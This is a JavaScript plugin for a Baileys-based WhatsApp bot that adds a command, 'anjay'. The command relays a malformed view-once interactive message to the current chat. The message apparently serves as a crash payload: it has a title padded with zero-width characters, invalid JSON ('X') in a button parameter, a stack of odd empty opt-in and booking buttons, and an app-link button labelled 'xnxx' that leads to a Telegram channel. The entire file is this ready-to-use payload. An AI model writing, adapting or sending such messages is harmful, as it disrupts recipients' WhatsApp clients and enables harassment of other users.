import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

let handler = async (m, { conn }) => {
  try {
    const msg = await generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: {
              text: "🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸"
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                {
                  name: "single_select",
                  buttonsParamsJson: "X"
                },
                {
                  name: "booking_confirmation",
                  buttonsParamsJson: JSON.stringify({})
                },
                {
                  name: "psi_opt_outs",
                  buttonsParamsJson: JSON.stringify({})
                },
                {
                  name: "psi_tos_opt_in",
                  buttonsParamsJson: JSON.stringify({})
                },
                {
                  name: "psi_nux_opt_in",
                  buttonsParamsJson: JSON.stringify({})
                },
                {
                  name: "cta_app_link",
                  buttonParamsJson: JSON.stringify({
                    display_text: "xnxx",
                    android_app_metadata: {
                      url: "https://t.me/devor6core",
                      consented_users_url: "https://t.me/devor6core"
                    }
                  })
                }
              ]
            }
          }
        }
      }
    }, {});

    await conn.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id
    });
  } catch (err) {
    console.error(err);
    m.reply("❌ Terjadi error saat kirim interactive message.");
  }
};

handler.help = ["anjay"];
handler.tags = ["tools"];
handler.command = ["anjay"];
handler.limit = 1;

export default handler;
